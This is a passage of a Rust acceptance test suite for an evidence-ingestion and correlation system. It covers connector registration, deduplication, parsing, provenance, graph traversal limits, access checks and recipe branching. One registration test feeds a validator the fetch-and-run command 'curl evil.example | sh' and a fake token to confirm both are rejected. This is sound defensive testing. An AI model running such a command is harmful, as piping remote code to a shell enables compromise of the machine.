// Acceptance tests of Work Capture & Evidence Ingestion, numbered after the specification's
// mandatory list (1-22), plus the end-to-end demonstration and store persistence. They run against
// the deterministic fixture scenario (src/capture/fixtures/failed_deployment.json).

use std::collections::BTreeSet;

use serde_json::{json, Value};

use super::broker::recipe::{failed_deployment, Budget, Predicate, RecipeBook, RecipeStep};
use super::broker::run::{
    EvidenceQueryBroker, ExecutionMode, ReplayFidelity, StepState, StopReason,
};
use super::correlate::assertions::{hypothesis, trace, AssertionStatus, Claim, DerivationMethod};
use super::correlate::graph::{
    Direction, EvidenceGraph, LimitHit, TraversalRequest, HARD_MAX_DEPTH,
};
use super::correlate::link::{link, LinkContext};
use super::correlate::model::{
    entity_id, Entity, EntityKind, NodeRef, Relation, RelationStatus, RelationType,
};
use super::demo::{self, Scenario};
use super::format::record::{EvidenceType, ParseStatus, Payload};
use super::ingest::contributions::{
    transition_allowed, ContributionStatus, ContributionType, Locality, Namespace, Proposal,
    TargetKind, TargetRef,
};
use super::ingest::episode::{EpisodeOutcome, Question, QuestionState, WorkEpisode};
use super::ingest::pack::{InvestigationStatus, SourceState, WarningKind};
use super::resources::connector::{
    ConnectorStatus, QueryScope, QuerySpec, ResourceConnector, SourceRecord,
};
use super::resources::fixture::{FixtureBehavior, FixtureConnector};
use super::resources::registry::{ResourceRegistry, ResourceStatus};
use super::store::{CaptureStore, IngestKind, IngestPath};
use super::{AccessPolicy, Actor, ActorKind, Clock, ErrorCode, Sensitivity, Truth};
use crate::telemetry::model::Telemetry;

/** Load the scenario, optionally changed
 * Input
    - change: impl FnOnce(&mut Scenario) - modification
 * Output
    - Scenario
*/
fn scenario_with(change: impl FnOnce(&mut Scenario)) -> Scenario {
    let mut scenario = demo::scenario().expect("fixture loads");
    change(&mut scenario);
    scenario
}

/** Find a fixture resource of a scenario
 * Input
    - scenario: &mut Scenario - scenario
    - id: &str - resource id
 * Output
    - &mut demo::FixtureResource
*/
fn resource<'a>(scenario: &'a mut Scenario, id: &str) -> &'a mut demo::FixtureResource {
    scenario
        .resources
        .iter_mut()
        .find(|resource| resource.resource_id == id)
        .expect("fixture resource")
}

/** Build a broker over a scenario with a fixed clock
 * Input
    - scenario: &Scenario - scenario
 * Output
    - EvidenceQueryBroker
*/
fn broker(scenario: &Scenario) -> EvidenceQueryBroker {
    demo::broker(scenario, Clock::fixed(demo::DEMO_EPOCH)).expect("broker builds")
}

/** Run the scenario's investigation
 * Input
    - scenario: &Scenario - scenario
 * Output
    - (EvidenceQueryBroker, crate::capture::broker::run::EvidenceQueryResult)
*/
fn investigate(
    scenario: &Scenario,
) -> (
    EvidenceQueryBroker,
    crate::capture::broker::run::EvidenceQueryResult,
) {
    let mut broker = broker(scenario);
    let result = broker
        .investigate(demo::request(scenario), &demo::engineer(scenario))
        .expect("investigation runs");
    (broker, result)
}

/** A source record for direct ingestion tests
 * Input
    - id: &str - record id
    - evidence_type: EvidenceType - type
    - content: Value - content
    - timestamp: Option<u64> - source time
 * Output
    - SourceRecord
*/
fn record(
    id: &str,
    evidence_type: EvidenceType,
    content: Value,
    timestamp: Option<u64>,
) -> SourceRecord {
    SourceRecord {
        record_id: id.into(),
        evidence_type,
        media_type: "application/json".into(),
        content,
        source_timestamp: timestamp,
        source_revision: Some("1".into()),
        metadata: Default::default(),
    }
}

/** The relation of a type between two entities, if any
 * Input
    - graph: &EvidenceGraph - graph
    - relation_type: RelationType - type
    - source: (EntityKind, &str) - source kind and key
    - target: (EntityKind, &str) - target kind and key
 * Output
    - Option<Relation>
*/
fn relation(
    graph: &EvidenceGraph,
    relation_type: RelationType,
    source: (EntityKind, &str),
    target: (EntityKind, &str),
) -> Option<Relation> {
    let source = NodeRef::Entity(entity_id(source.0, source.1));
    let target = NodeRef::Entity(entity_id(target.0, target.1));
    graph
        .relations
        .values()
        .find(|relation| {
            relation.relation_type == relation_type
                && relation.source == source
                && relation.target == target
        })
        .cloned()
}

/** 1. A valid resource registers; an unknown connector type, a wildcard scope, a raw secret as
 * credential reference, and an undeclared configuration key are rejected
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn registers_resources_and_rejects_invalid_connectors() {
    let scenario = demo::scenario().unwrap();
    let base = demo::definition(&scenario.resources[0], &scenario);
    let mut registry = ResourceRegistry::default();
    registry.register(base.clone(), 5).unwrap();
    assert_eq!(registry.get("tracker").unwrap().created_at, 5);
    let mut unknown = base.clone();
    unknown.connector_type = "shell".into();
    assert_eq!(
        registry.register(unknown, 6).unwrap_err().code,
        ErrorCode::UnknownConnector
    );
    let mut wildcard = base.clone();
    wildcard.scope.repositories = vec!["acme/*".into()];
    assert_eq!(
        registry.register(wildcard, 6).unwrap_err().code,
        ErrorCode::InvalidRegistration
    );
    let mut secret = base.clone();
    secret.auth_reference = Some("ghp_0123456789abcdefghijklmnopqrstuvwxyz".into());
    assert_eq!(
        registry.register(secret, 6).unwrap_err().code,
        ErrorCode::InvalidRegistration
    );
    let mut command = base.clone();
    command
        .configuration
        .insert("command".into(), "curl evil.example | sh".into());
    assert_eq!(
        registry.register(command, 6).unwrap_err().code,
        ErrorCode::InvalidRegistration
    );
    let mut changed = base;
    changed
        .configuration
        .insert("fixture".into(), "other".into());
    assert!(
        registry.register(changed.clone(), 7).is_err(),
        "a configuration change must raise its version"
    );
    changed.configuration_version = 2;
    registry.register(changed, 7).unwrap();
    assert_eq!(registry.get("tracker").unwrap().created_at, 5);
    registry
        .set_status("tracker", ResourceStatus::Disabled, 8)
        .unwrap();
    assert_eq!(
        registry.get("tracker").unwrap().status,
        ResourceStatus::Disabled
    );
}

/** 2. Connector success, partial result, timeout, unauthorized, and unavailable outcomes stay
 * structured, and the broker never turns a failure into an empty success
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn connector_outcomes_are_structured() {
    let records = vec![
        record(
            "a",
            EvidenceType::CiRun,
            json!({"commit": "c1", "status": "success"}),
            Some(1),
        ),
        record(
            "b",
            EvidenceType::CiRun,
            json!({"commit": "c1", "status": "success"}),
            Some(2),
        ),
    ];
    let spec = QuerySpec {
        evidence_type: None,
        filters: Default::default(),
        since: None,
        until: None,
        limit: 10,
        cursor: None,
        scope: QueryScope::default(),
    };
    let normal = FixtureConnector::new(records.clone());
    assert_eq!(normal.query(&spec).status, ConnectorStatus::Ok);
    assert_eq!(normal.query(&spec).records.len(), 2);
    assert_eq!(normal.get_metadata("a").records[0].content, Value::Null);
    assert_eq!(normal.calls(), 3);
    let paged = normal.query(&QuerySpec {
        limit: 1,
        ..spec.clone()
    });
    assert_eq!(paged.next_cursor.as_deref(), Some("1"));
    let partial = FixtureConnector::new(records.clone())
        .with_behavior(FixtureBehavior::Partial(1))
        .query(&spec);
    assert_eq!(
        (partial.status, partial.records.len()),
        (ConnectorStatus::Partial, 1)
    );
    assert!(partial.error.is_some());
    for status in [
        ConnectorStatus::Timeout,
        ConnectorStatus::Unauthorized,
        ConnectorStatus::Unavailable,
    ] {
        let failed =
            FixtureConnector::new(records.clone()).with_behavior(FixtureBehavior::Fail(status));
        let outcome = failed.query(&spec);
        assert_eq!(outcome.status, status);
        assert!(outcome.records.is_empty() && outcome.error.is_some());
        assert!(!failed.health_check().available);
    }
    let mut scenario = demo::scenario().unwrap();
    let mut broker = broker(&scenario);
    broker.connectors.insert(
        "ci".into(),
        Box::new(
            FixtureConnector::new(resource(&mut scenario, "ci").records.clone())
                .with_behavior(FixtureBehavior::Fail(ConnectorStatus::Timeout)),
        ),
    );
    let result = broker
        .investigate(demo::request(&scenario), &demo::engineer(&scenario))
        .unwrap();
    let ci = result
        .pack
        .sources
        .iter()
        .find(|source| source.step_id == "ci")
        .unwrap();
    assert_eq!(ci.state, SourceState::Unavailable);
    assert!(ci.detail.contains("Timeout"));
    let missing = result
        .pack
        .missing_evidence
        .iter()
        .find(|missing| missing.evidence_type == EvidenceType::CiRun)
        .unwrap();
    assert_eq!(missing.state, SourceState::Unavailable);
    assert!(result.audit.metrics.connector_failures >= 1);
}

/** 3. A repeated webhook delivery, a retry through another path, and a duplicate record produce
 * one evidence record that keeps every observing path; a changed revision supersedes it
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn deduplicates_repeated_deliveries() {
    let scenario = demo::scenario().unwrap();
    let definition = demo::definition(&scenario.resources[2], &scenario);
    let mut store = CaptureStore::in_memory();
    let run = record(
        "run-1",
        EvidenceType::CiRun,
        json!({"commit": "c1", "status": "success"}),
        Some(10),
    );
    let webhook = IngestPath {
        kind: "webhook".into(),
        id: "delivery-1".into(),
    };
    let first = store.ingest(&definition, &run, &webhook, None, None, 100);
    assert_eq!(first.kind, IngestKind::New);
    assert_eq!(
        store
            .ingest(&definition, &run, &webhook, None, None, 101)
            .kind,
        IngestKind::Duplicate
    );
    let retry = store.ingest(
        &definition,
        &run,
        &IngestPath {
            kind: "retry".into(),
            id: "poll-7".into(),
        },
        None,
        None,
        102,
    );
    assert_eq!(
        (retry.kind, retry.evidence_id.clone()),
        (IngestKind::Duplicate, first.evidence_id.clone())
    );
    assert_eq!(store.evidence.len(), 1);
    let paths = &store.evidence[&first.evidence_id]
        .provenance
        .ingestion_paths;
    assert_eq!(
        paths,
        &vec!["webhook:delivery-1".to_string(), "retry:poll-7".to_string()]
    );
    let artifact = store.artifacts.values().next().unwrap();
    assert_eq!(artifact.observed_via.len(), 2);
    let mut changed = run.clone();
    changed.source_revision = Some("2".into());
    changed.content = json!({"commit": "c1", "status": "failure"});
    let revision = store.ingest(
        &definition,
        &changed,
        &IngestPath {
            kind: "webhook".into(),
            id: "delivery-2".into(),
        },
        None,
        None,
        103,
    );
    assert_eq!(revision.kind, IngestKind::NewRevision);
    assert_eq!(
        store.evidence[&revision.evidence_id].supersedes.as_deref(),
        Some(first.evidence_id.as_str())
    );
    store.set_cursor("ci", "delivery-2");
    assert_eq!(store.cursor("ci").map(String::as_str), Some("delivery-2"));
}

/** 4. Event time and ingestion time stay separate; a record without a time keeps None
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn separates_observed_and_ingestion_time() {
    let scenario = demo::scenario().unwrap();
    let definition = demo::definition(&scenario.resources[2], &scenario);
    let mut store = CaptureStore::in_memory();
    let path = IngestPath {
        kind: "query".into(),
        id: "q".into(),
    };
    let timed = store.ingest(
        &definition,
        &record(
            "r1",
            EvidenceType::CiRun,
            json!({"commit": "c", "status": "success"}),
            Some(1_000),
        ),
        &path,
        None,
        None,
        9_000,
    );
    let evidence = &store.evidence[&timed.evidence_id];
    assert_eq!(
        (evidence.observed_at, evidence.ingested_at),
        (Some(1_000), 9_000)
    );
    let untimed = store.ingest(
        &definition,
        &record(
            "r2",
            EvidenceType::CiRun,
            json!({"commit": "c", "status": "success"}),
            None,
        ),
        &path,
        None,
        None,
        9_500,
    );
    let evidence = &store.evidence[&untimed.evidence_id];
    assert_eq!(evidence.observed_at, None);
    assert!(evidence
        .parse_issues
        .iter()
        .any(|issue| issue.field == "observed_at"));
    assert_eq!(store.evidence_in_window(500, 1_500, 10).len(), 1);
}

/** 5. Valid, malformed, and partially valid evidence parse as parsed, failed, and partially
 * parsed; missing values are never defaulted
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn parses_valid_malformed_and_partial_evidence() {
    let scenario = demo::scenario().unwrap();
    let definition = demo::definition(&scenario.resources[2], &scenario);
    let mut store = CaptureStore::in_memory();
    let path = IngestPath {
        kind: "query".into(),
        id: "q".into(),
    };
    let mut ingest = |id: &str, kind: EvidenceType, content: Value| {
        let outcome = store.ingest(
            &definition,
            &record(id, kind, content, Some(1)),
            &path,
            None,
            None,
            2,
        );
        store.evidence[&outcome.evidence_id].clone()
    };
    let valid = ingest(
        "v",
        EvidenceType::CiRun,
        json!({"commit": "c", "status": "failure"}),
    );
    assert_eq!(valid.parse_status, ParseStatus::Parsed);
    let malformed = ingest("m", EvidenceType::CiRun, json!("not an object"));
    assert_eq!(malformed.parse_status, ParseStatus::Failed);
    assert!(malformed.payload.is_none());
    let partial = ingest(
        "p",
        EvidenceType::TestReport,
        json!({"commit": "c", "passed": "many"}),
    );
    assert_eq!(partial.parse_status, ParseStatus::PartiallyParsed);
    assert!(partial
        .parse_issues
        .iter()
        .any(|issue| issue.field == "failed" && issue.problem == "missing"));
    assert!(partial
        .parse_issues
        .iter()
        .any(|issue| issue.field == "passed" && issue.problem == "malformed"));
    assert_eq!(partial.field("failed"), None);
    let metric = ingest(
        "mt",
        EvidenceType::Metric,
        json!({"points": [{"name": "errors", "value": null}, {"name": "latency", "value": "slow"}, {"name": "rps", "value": 3.5}]}),
    );
    let Some(Payload::Measurement { points }) = &metric.payload else {
        panic!("measurement payload")
    };
    assert_eq!(
        (points[0].value, points[0].status),
        (None, Telemetry::Unobserved)
    );
    assert_eq!(points[1].value, None);
    assert_eq!(points[2].value, Some(3.5));
    assert_eq!(metric.parse_status, ParseStatus::PartiallyParsed);
    let log = ingest("l", EvidenceType::RuntimeLog, json!(42));
    assert_eq!(log.parse_status, ParseStatus::Failed);
}

/** 6. Normalization keeps the raw artifact reference and provenance, and secrets never reach the
 * stored content
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn preserves_artifacts_and_provenance() {
    let (broker, result) = investigate(&demo::scenario().unwrap());
    let log = result
        .pack
        .evidence
        .iter()
        .find(|evidence| evidence.evidence_type == EvidenceType::RuntimeLog)
        .expect("log selected");
    let artifact = &broker.store.artifacts[&log.artifact.artifact_id];
    assert_eq!(
        (
            artifact.source_resource_id.as_str(),
            artifact.source_record_id.as_str()
        ),
        ("logs", "log-7731-1")
    );
    assert_eq!(log.artifact.content_hash, artifact.content_hash);
    assert_eq!(
        log.artifact.storage_reference,
        format!("blob:{}", artifact.content_hash.clone().unwrap())
    );
    assert_eq!(artifact.sensitivity, Sensitivity::Confidential);
    assert!(artifact.redactions >= 1);
    let blob = broker.store.blobs[artifact.content_hash.as_ref().unwrap()].to_string();
    assert!(!blob.contains("Sup3rS3cretValue") && blob.contains("REDACTED"));
    assert!(!serde_json::to_string(&result.pack)
        .unwrap()
        .contains("Sup3rS3cretValue"));
    let evidence = &broker.store.evidence[&log.evidence_id];
    assert_eq!(evidence.provenance.connector_type, "fixture");
    assert_eq!(
        (
            evidence.provenance.parser.as_str(),
            evidence.provenance.parser_version.as_str()
        ),
        ("text", "1")
    );
    assert_eq!(
        evidence.provenance.query_id.as_deref(),
        Some(result.audit.query_id.as_str())
    );
    assert_eq!(evidence.source_ref.revision.as_deref(), Some("1"));
}

/** 7. Task, pull request, commit, CI result, and deployment are linked through typed relations
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn links_task_change_ci_and_deployment() {
    let (broker, result) = investigate(&demo::scenario().unwrap());
    let graph = &broker.store.graph;
    let declared = relation(
        graph,
        RelationType::ResultedIn,
        (EntityKind::Task, "PAY-142"),
        (EntityKind::PullRequest, "418"),
    )
    .expect("task to pull request");
    assert_eq!(declared.status, RelationStatus::Declared);
    assert_eq!(
        relation(
            graph,
            RelationType::Contains,
            (EntityKind::PullRequest, "418"),
            (EntityKind::Commit, "9f1c2ab7d4")
        )
        .unwrap()
        .status,
        RelationStatus::Observed
    );
    assert!(relation(
        graph,
        RelationType::Triggered,
        (EntityKind::Commit, "9f1c2ab7d4"),
        (EntityKind::CiRun, "run-5521")
    )
    .is_some());
    assert!(relation(
        graph,
        RelationType::ResultedIn,
        (EntityKind::Commit, "9f1c2ab7d4"),
        (EntityKind::Deployment, "dep-7731")
    )
    .is_some());
    assert!(relation(
        graph,
        RelationType::DeployedTo,
        (EntityKind::Deployment, "dep-7731"),
        (EntityKind::Environment, "production")
    )
    .is_some());
    assert!(relation(
        graph,
        RelationType::Writes,
        (EntityKind::Commit, "9f1c2ab7d4"),
        (EntityKind::File, "app/refund_worker.py")
    )
    .is_some());
    let zone = relation(
        graph,
        RelationType::BelongsToZone,
        (EntityKind::File, "app/refunds.py"),
        (EntityKind::Zone, "refunds"),
    )
    .expect("file in zone");
    assert_eq!(zone.version_scope.as_deref(), Some("zone:refunds@v3"));
    assert!(relation(
        graph,
        RelationType::BelongsToFlow,
        (EntityKind::File, "app/refund_worker.py"),
        (EntityKind::Flow, "refund-flow")
    )
    .is_some());
    assert!(relation(
        graph,
        RelationType::GovernedBy,
        (EntityKind::Zone, "refunds"),
        (EntityKind::Policy, "refund_safety")
    )
    .is_some());
    let episode = result.pack.episode_id.clone().unwrap();
    assert!(relation(
        graph,
        RelationType::ExecutedDuring,
        (EntityKind::AgentSession, "ses_demo01"),
        (EntityKind::WorkEpisode, &episode)
    )
    .is_some());
    let deployment = entity_id(EntityKind::Deployment, "dep-7731");
    assert!(!broker.store.evidence_for_entity(&deployment, 10).is_empty());
    assert!(result
        .pack
        .entities
        .iter()
        .any(|entity| entity.entity_id == deployment));
}

/** 8. An assertion derived from other assertions traces back to the original evidence
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn traces_derived_assertions_to_evidence() {
    let (broker, result) = investigate(&demo::scenario().unwrap());
    let verified = result
        .pack
        .assertions
        .iter()
        .find(|assertion| assertion.claim.predicate == "change_verified")
        .expect("derived assertion");
    assert_eq!(verified.truth(), Truth::No, "the deployment failed");
    assert!(verified.supporting.is_empty() && !verified.derived_from.is_empty());
    let lineage = trace(&verified.assertion_id, &broker.store.assertions, 4);
    assert!(lineage.complete);
    let deployment = result
        .pack
        .evidence
        .iter()
        .find(|evidence| evidence.evidence_type == EvidenceType::Deployment)
        .unwrap();
    assert!(lineage.evidence.contains(&deployment.evidence_id));
    assert!(lineage.chain.len() > 1);
    let (supported, _) = broker
        .store
        .assertions_for_evidence(&deployment.evidence_id);
    assert!(supported
        .iter()
        .any(|assertion| assertion.claim.predicate == "deployment_succeeded"));
    let shallow = trace(&verified.assertion_id, &broker.store.assertions, 0);
    assert!(!shallow.complete);
}

/** 9. A relation derived by a rule is stored as inferred, never as observed
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn keeps_inferred_relations_distinct() {
    let scenario = demo::scenario().unwrap();
    let definition = demo::definition(&scenario.resources[1], &scenario);
    let mut store = CaptureStore::in_memory();
    let pr = record(
        "77",
        EvidenceType::PullRequest,
        json!({"number": "77", "head_sha": "abc", "branch": "fix/pay-9-retry", "repository": "acme/payments"}),
        Some(1),
    );
    let outcome = store.ingest(
        &definition,
        &pr,
        &IngestPath {
            kind: "query".into(),
            id: "q".into(),
        },
        None,
        None,
        2,
    );
    let evidence = store.evidence[&outcome.evidence_id].clone();
    link(
        &mut store.graph,
        &evidence,
        &LinkContext {
            task: Some("PAY-9"),
            episode: None,
        },
    );
    let inferred = relation(
        &store.graph,
        RelationType::ResultedIn,
        (EntityKind::Task, "PAY-9"),
        (EntityKind::PullRequest, "77"),
    )
    .expect("inferred link");
    assert_eq!(inferred.status, RelationStatus::Inferred);
    assert_eq!(inferred.provenance.method, "branch_name_match");
    assert!(store
        .graph
        .relations
        .values()
        .all(
            |relation| !(relation.relation_type == RelationType::ResultedIn
                && relation.status == RelationStatus::Observed)
        ));
    let only_observed = TraversalRequest {
        start: vec![NodeRef::Entity(entity_id(EntityKind::Task, "PAY-9"))],
        relation_types: vec![RelationType::ResultedIn],
        statuses: vec![RelationStatus::Observed],
        direction: Direction::Both,
        max_depth: 2,
        max_results: 10,
        max_bytes: 100_000,
        at: None,
    };
    assert_eq!(
        store
            .graph
            .traverse(&only_observed, &|_| true)
            .unwrap()
            .nodes
            .len(),
        1
    );
    let bad = Relation::new(
        RelationType::Supports,
        NodeRef::Entity(entity_id(EntityKind::Task, "PAY-9")),
        NodeRef::Entity(entity_id(EntityKind::PullRequest, "77")),
        RelationStatus::Observed,
        "test",
        Vec::new(),
    );
    assert_eq!(
        store.graph.add_relation(bad).unwrap_err().code,
        ErrorCode::InvalidRelation
    );
}

/** 10. Traversal enforces depth, result, and payload limits and names its relation types
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn enforces_traversal_limits() {
    let mut graph = EvidenceGraph::default();
    let ids = (0..10)
        .map(|index| graph.add_entity(Entity::new(EntityKind::Service, &format!("svc-{index}"))))
        .collect::<Vec<_>>();
    for pair in ids.windows(2) {
        graph
            .add_relation(Relation::new(
                RelationType::Calls,
                NodeRef::Entity(pair[0].clone()),
                NodeRef::Entity(pair[1].clone()),
                RelationStatus::Declared,
                "test",
                Vec::new(),
            ))
            .unwrap();
    }
    let request = |depth: usize, results: usize, bytes: usize| TraversalRequest {
        start: vec![NodeRef::Entity(ids[0].clone())],
        relation_types: vec![RelationType::Calls],
        statuses: Vec::new(),
        direction: Direction::Outgoing,
        max_depth: depth,
        max_results: results,
        max_bytes: bytes,
        at: None,
    };
    let deep = graph
        .traverse(&request(2, 100, 1_000_000), &|_| true)
        .unwrap();
    assert_eq!((deep.nodes.len(), deep.depth_reached), (3, 2));
    assert!(deep.limits.contains(&LimitHit::Depth));
    let few = graph
        .traverse(&request(9, 3, 1_000_000), &|_| true)
        .unwrap();
    assert_eq!(few.nodes.len(), 3);
    assert!(few.limits.contains(&LimitHit::Results));
    let small = graph.traverse(&request(9, 100, 300), &|_| true).unwrap();
    assert!(small.limits.contains(&LimitHit::Bytes) && small.nodes.len() < 10);
    let clamped = graph
        .traverse(&request(100, 100, 1_000_000), &|_| true)
        .unwrap();
    assert_eq!(clamped.depth_reached, HARD_MAX_DEPTH);
    let hidden = graph
        .traverse(&request(9, 100, 1_000_000), &|node| node.id() != ids[3])
        .unwrap();
    assert_eq!((hidden.nodes.len(), hidden.hidden), (3, 1));
    let mut unnamed = request(2, 10, 1000);
    unnamed.relation_types.clear();
    assert_eq!(
        graph.traverse(&unnamed, &|_| true).unwrap_err().code,
        ErrorCode::InvalidQuery
    );
}

/** 11. A request that explicitly asks for a resource or repository the actor may not access is
 * rejected before any source is queried; an implicit step without a permitted resource is denied
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn rejects_unauthorized_queries() {
    let scenario = demo::scenario().unwrap();
    let mut policy = demo::engineer(&scenario);
    policy.resources.remove("logs");
    let mut explicit = demo::request(&scenario);
    explicit.resources = vec!["deploy".into(), "logs".into()];
    let mut broker = broker(&scenario);
    let rejected = broker.investigate(explicit, &policy).unwrap();
    assert_eq!(rejected.pack.status, InvestigationStatus::Rejected);
    assert_eq!(
        (
            rejected.audit.metrics.connector_calls,
            rejected.audit.usage.steps
        ),
        (0, 0)
    );
    assert!(rejected.audit.steps.is_empty() && rejected.pack.evidence.is_empty());
    assert!(rejected
        .audit
        .policy_decisions
        .iter()
        .any(|decision| decision.subject == "logs"
            && decision.effect == super::broker::run::Effect::Deny));
    let mut other_repository = demo::request(&scenario);
    other_repository.known.repository = Some("acme/ledger".into());
    assert_eq!(
        broker
            .investigate(other_repository, &demo::engineer(&scenario))
            .unwrap()
            .pack
            .status,
        InvestigationStatus::Rejected
    );
    let implicit = broker
        .investigate(demo::request(&scenario), &policy)
        .unwrap();
    let logs = implicit
        .audit
        .steps
        .iter()
        .find(|step| step.step_id == "deploy-logs")
        .unwrap();
    assert_eq!(logs.state, StepState::Denied);
    let missing = implicit
        .pack
        .missing_evidence
        .iter()
        .find(|missing| missing.evidence_type == EvidenceType::RuntimeLog)
        .unwrap();
    assert_eq!(missing.state, SourceState::Denied);
    assert!(implicit
        .pack
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Access));
}

/** 12. A conditional recipe follows the branches whose conditions hold and skips the others
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn executes_conditional_recipes() {
    let (_, failed) = investigate(&demo::scenario().unwrap());
    let branch = |result: &crate::capture::broker::run::EvidenceQueryResult, step: &str| {
        result
            .audit
            .branches
            .iter()
            .find(|branch| branch.step_id == step)
            .map(|branch| branch.held)
    };
    assert_eq!(branch(&failed, "deploy-logs"), Some(true));
    assert_eq!(branch(&failed, "runtime-metrics"), Some(true));
    assert_eq!(branch(&failed, "schema"), Some(false));
    assert!(failed
        .audit
        .steps
        .iter()
        .filter(|step| step.step_id == "schema")
        .all(|step| step.state == StepState::Skipped));
    assert!(failed
        .pack
        .evidence
        .iter()
        .any(|evidence| evidence.evidence_type == EvidenceType::RuntimeLog));
    let healthy = scenario_with(|scenario| {
        let deploy = resource(scenario, "deploy");
        deploy.records[0].content["status"] = json!("succeeded");
        deploy.records[0].content["migration"] = json!("true");
    });
    let (_, succeeded) = investigate(&healthy);
    assert_eq!(branch(&succeeded, "deploy-logs"), Some(false));
    assert_eq!(branch(&succeeded, "schema"), Some(true));
    assert!(!succeeded
        .pack
        .evidence
        .iter()
        .any(|evidence| evidence.evidence_type == EvidenceType::RuntimeLog));
    assert!(succeeded
        .pack
        .evidence
        .iter()
        .any(|evidence| evidence.evidence_type == EvidenceType::Configuration));
    assert!(!succeeded
        .pack
        .missing_evidence
        .iter()
        .any(|missing| missing.evidence_type == EvidenceType::RuntimeLog));
}

/** 13. The audit records the exact recipe version and digest, branch decisions, and query history
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn records_recipe_version_and_history() {
    let (broker, result) = investigate(&demo::scenario().unwrap());
    let recipe = result.audit.recipe.clone().unwrap();
    assert_eq!(
        (recipe.recipe_id.as_str(), recipe.version),
        ("failed-deployment", 1)
    );
    assert_eq!(
        result.audit.recipe_digest.as_deref(),
        Some(failed_deployment().digest().as_str())
    );
    assert_eq!(
        result.pack.retrieval.recipe_digest,
        failed_deployment().digest()
    );
    assert_eq!(result.pack.retrieval.branches, result.audit.branches);
    let order = result
        .audit
        .steps
        .iter()
        .map(|step| step.step_id.as_str())
        .collect::<Vec<_>>();
    assert_eq!(order.first(), Some(&"scope-zone"));
    let pull = result
        .audit
        .steps
        .iter()
        .find(|step| step.step_id == "pull-request")
        .unwrap();
    assert_eq!(pull.parameters, json!({"record": "418"}));
    assert_eq!(pull.record_ids, vec!["418".to_string()]);
    assert!(pull.snapshot.as_deref().unwrap().starts_with("fixture:"));
    let ci = result
        .audit
        .steps
        .iter()
        .find(|step| step.step_id == "ci")
        .unwrap();
    assert_eq!(ci.parameters["filters"]["commit"], json!("9f1c2ab7d4"));
    assert!(result
        .audit
        .scope
        .learned
        .iter()
        .any(|fact| fact.field == "commit" && fact.value == "9f1c2ab7d4"));
    assert_eq!(
        broker
            .store
            .audit(&result.audit.query_id)
            .unwrap()
            .pack_id
            .as_deref(),
        Some(result.pack.pack_id.as_str())
    );
    let mut book = RecipeBook::default();
    book.add(failed_deployment()).unwrap();
    let mut altered = failed_deployment();
    altered.steps.pop();
    assert_eq!(
        book.add(altered).unwrap_err().code,
        ErrorCode::InvalidRecipe
    );
    let mut invalid = failed_deployment();
    invalid.version = 2;
    invalid.steps[0].record = Some("{everything}".into());
    assert!(invalid.validate().is_err());
}

/** 14. Contradictory evidence is kept on both sides and no winner is selected
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn keeps_contradictions_unresolved() {
    let conflicting = scenario_with(|scenario| {
        let deploy = resource(scenario, "deploy");
        let mut canary = deploy.records[1].clone();
        canary.record_id = "check-canary-7731".into();
        canary.content = json!({"deployment": "dep-7731", "check": "canary", "healthy": true, "environment": "production"});
        deploy.records.push(canary);
    });
    let (_, result) = investigate(&conflicting);
    let deployment = result
        .pack
        .assertions
        .iter()
        .find(|assertion| assertion.claim.predicate == "deployment_succeeded")
        .unwrap();
    assert_eq!(deployment.status, AssertionStatus::Unresolved);
    assert_eq!(
        (deployment.supporting.len(), deployment.contradicting.len()),
        (1, 2)
    );
    assert!(deployment.conflicted());
    assert!(result
        .pack
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Conflict));
    let verified = result
        .pack
        .assertions
        .iter()
        .find(|assertion| assertion.claim.predicate == "change_verified")
        .unwrap();
    assert_eq!(verified.truth(), Truth::Unknown);
}

/** 15. Missing or unavailable evidence is unknown, never false
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn missing_evidence_is_unknown() {
    assert_eq!(Truth::from_option(None), Truth::Unknown);
    let (_, result) = investigate(&demo::scenario().unwrap());
    let tests = result
        .pack
        .assertions
        .iter()
        .find(|assertion| assertion.claim.predicate == "tests_passed")
        .unwrap();
    assert_eq!(
        (tests.truth(), tests.status),
        (Truth::Unknown, AssertionStatus::Unresolved)
    );
    assert!(tests.contradicting.is_empty());
    let missing = result
        .pack
        .missing_evidence
        .iter()
        .find(|missing| missing.evidence_type == EvidenceType::TestReport)
        .unwrap();
    assert_eq!(missing.state, SourceState::Empty);
    let metrics = result
        .pack
        .missing_evidence
        .iter()
        .find(|missing| missing.evidence_type == EvidenceType::Metric)
        .unwrap();
    assert_eq!(metrics.state, SourceState::Unavailable);
    assert!(result
        .pack
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Uncertainty
            && warning.message.contains("tests_passed")));
    let ci = result
        .pack
        .assertions
        .iter()
        .find(|assertion| assertion.claim.predicate == "ci_passed")
        .unwrap();
    assert_eq!(
        (ci.truth(), ci.status),
        (Truth::Yes, AssertionStatus::Supported)
    );
}

/** 16. An agent's contribution is recorded as proposed and never trusted automatically
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn agent_contributions_stay_proposed() {
    let report = demo::run().unwrap();
    let hypothesis_contribution = report
        .contributions
        .iter()
        .find(|contribution| contribution.contribution_type == ContributionType::Hypothesis)
        .unwrap();
    assert_eq!(
        (
            hypothesis_contribution.status,
            hypothesis_contribution.namespace
        ),
        (ContributionStatus::Proposed, Namespace::AgentProposed)
    );
    assert_eq!(hypothesis_contribution.contributor_type, ActorKind::Agent);
    let (mut broker, result) = investigate(&demo::scenario().unwrap());
    let agent = Actor::new("agent-1", ActorKind::Agent);
    let log = result
        .pack
        .evidence
        .iter()
